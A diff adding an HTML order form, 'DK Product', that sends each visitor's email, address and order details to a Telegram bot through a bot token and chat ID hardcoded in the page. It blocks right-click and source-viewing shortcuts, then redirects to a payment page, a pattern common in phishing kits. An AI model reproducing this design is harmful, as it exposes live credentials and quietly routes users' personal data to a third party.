@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DK Product</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { 
+            background: linear-gradient(135deg, #1e1e1e, #323232); 
+            color: white; text-align: center; padding: 20px;
+        }
+        .container {
+            max-width: 400px; 
+            margin: auto; 
+            background: rgba(255, 255, 255, 0.1); 
+            padding: 20px; 
+            border-radius: 15px; 
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            font-size: 28px;
+            text-shadow: 0 0 10px cyan;
+            margin-bottom: 20px;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input, select {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+        select {
+            background: white; 
+            color: black; /* ✅ Country Select ফিক্সড */
+        }
+        input::placeholder { color: rgba(255, 255, 255, 0.7); }
+        button {
+            background: cyan;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover { background: #00bcd4; }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // ✅ ডেভেলপার টুল ব্লক করার জন্য
+            document.addEventListener("contextmenu", event => event.preventDefault()); // ✅ রাইট ক্লিক ব্লক!
+            document.addEventListener("keydown", function(event) {
+                if (event.ctrlKey && (event.key === "u" || event.key === "s" || event.key === "i" || event.key === "j")) {
+                    event.preventDefault(); // ✅ Inspect/Source দেখার জন্য শর্টকাট ব্লক!
+                }
+            });
+
+            // ✅ মাউস রাইট ক্লিক রোধ করতে
+            document.onkeydown = function(e) {
+                if(e.ctrlKey && e.keyCode == 85) { // Ctrl + U
+                    return false; 
+                }
+            };
+        });
+
+        // ✅ টেলিগ্রাম বটের তথ্য
+        const TELEGRAM_BOT_TOKEN = "7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE";
+        const TELEGRAM_CHAT_ID = "6807445600";
+
+        function sendToTelegram() {
+            const product = document.getElementById("product").value;
+            const price = document.getElementById("price").value;
+            const country = document.getElementById("country").value;
+            const email = document.getElementById("email").value;
+            const address = document.getElementById("address").value;
+
+            const message = `🛒 *New Order!* \n\n📦 Product: ${product}\n💰 Price: ${price}\n🌍 Country: ${country}\n📧 Email: ${email}\n🏠 Address: ${address}`;
+
+            // ✅ টেলিগ্রাম API ব্যবহার করে তথ্য পাঠানো
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
+            });
+
+            // ✅ পেমেন্ট পেজে রিডাইরেক্ট
+            setTimeout(() => {
+                window.location.href = "payment.html"; // ✅ পেমেন্ট পেজে নিয়ে যাবে
+            }, 1000);
+        }
+    </script>
+</head>
+<body>
+
+    <h1>🔥 DK Product 🔥</h1>
+    
+    <div class="container">
+        <form onsubmit="event.preventDefault(); sendToTelegram();">
+            <input type="text" id="product" placeholder="Product Name" required>
+            <input type="number" id="price" placeholder="Price" required>
+            
+            <select id="country" required>
+                <option value="USA">USA</option>
+                <option value="Canada">Canada</option>
+                <option value="UK">United Kingdom</option>
+                <option value="India">India</option>
+                <option value="Bangladesh">Bangladesh</option>
+            </select>
+            
+            <input type="email" id="email" placeholder="Email Address" required>
+            <input type="text" id="address" placeholder="Detailed Address" required>
+            
+            <!-- Pay Now Button -->
+            <button type="submit">Pay Now</button>
+        </form>
+    </div>
+
+</body>
+</html>
